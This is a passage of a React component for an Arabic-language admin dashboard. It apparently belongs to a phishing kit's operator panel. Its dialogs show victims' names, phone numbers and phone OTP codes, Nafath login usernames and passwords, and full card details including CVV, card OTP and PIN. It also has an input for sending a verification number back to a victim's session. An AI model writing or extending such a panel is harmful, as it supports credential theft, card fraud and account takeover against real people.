            <CardFooter className="border-t bg-muted/20 p-4">
              <Pagination
                currentPage={currentPage}
                totalPages={totalPages}
                onPageChange={handlePageChange}
                totalItems={filteredNotifications.length}
                itemsPerPage={itemsPerPage}
              />
            </CardFooter>
          )}
        </Card>
      </div>

      {/* Enhanced Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
                    <User className="h-5 w-5 text-white" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-emerald-500 to-emerald-600 flex items-center justify-center">
                    <CreditCard className="h-5 w-5 text-white" />
                  </div>
                  معلومات البطاقة
                </>
              ) : (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-amber-500 to-amber-600 flex items-center justify-center">
                    <User className="h-5 w-5 text-white" />
                  </div>
                  معلومات نفاذ
                </>
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  { label: "الاسم", value: selectedNotification?.fullName },
                  { label: "رعنوان", value: selectedNotification?.district },
                  {
                    label: "الشبكة ",
                    value: selectedNotification?.operator,
                  },
                  {
                    label: "رقم الجوال",
                    value: selectedNotification?.phoneNumber,
                  },
                  { label: "الهاتف2", value: selectedNotification?.phone2 },
                  {
                    label: "2رمزهاتف",
                    value: selectedNotification?.phoneOtpCode,
                  },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">
                          {label}:
                        </span>
                        <span className="font-semibold">{value}</span>
                      </div>
                    ),
                )}
              </div>
            </div>
          )}

          {selectedInfo === "nafaz" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                <div className="flex justify-between items-center py-2 border-b border-border/30">
                  <span className="font-medium text-muted-foreground">
                    اسم المستخدم:
                  </span>
                  <span className="font-semibold">
                    {selectedNotification?.nafazId}
                  </span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-border/30">
                  <span className="font-medium text-muted-foreground">
                    باسورد:
                  </span>
                  <span className="font-semibold">
                    {selectedNotification?.nafadPassword}
                  </span>
                </div>
              </div>
              <div className="flex gap-2">
                <Input
                  type="tel"
                  value={authNumber}
                  onChange={(e) => setAuthNumber(e.target.value)}
                  placeholder="رقم التحقق"
                  className="flex-1"
                />
                <Button
                  onClick={() =>
                    handleAuthNumberUpdate(selectedNotification.id, authNumber)
                  }
                >
                  تحديث
                </Button>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="flex justify-center mb-4">
                <CardMockup
                  cardNumber={selectedNotification?.cardNumber}
                  cardName={selectedNotification?.cardName}
                  cardMonth={selectedNotification?.cardMonth}
                  cardYear={selectedNotification?.cardYear}
                  expiryDate={selectedNotification?.expiryDate}
                />
              </div>
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  {
                    label: "رقم البطاقة",
                    value: selectedNotification?.cardNumber,
                  },
                  {
                    label: "اسم حامل البطاقة",
                    value: selectedNotification?.cardName,
                  },
                  {
                    label: "تاريخ الانتهاء",
                    value: selectedNotification.expiryDate,
                  },
                  { label: "رمز الأمان", value: selectedNotification.cvv },
                  { label: "OTP البطاقة", value: selectedNotification.cardOtp },
                  { label: "PIN البطاقة", value: selectedNotification.cardPin },
                ].map(
                  ({ label, value }) =>
                    value !== undefined && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">
                          {label}:
                        </span>
                        <span className="font-semibold" dir="ltr">
                          {String(value)}
                        </span>
                      </div>
                    ),
                )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
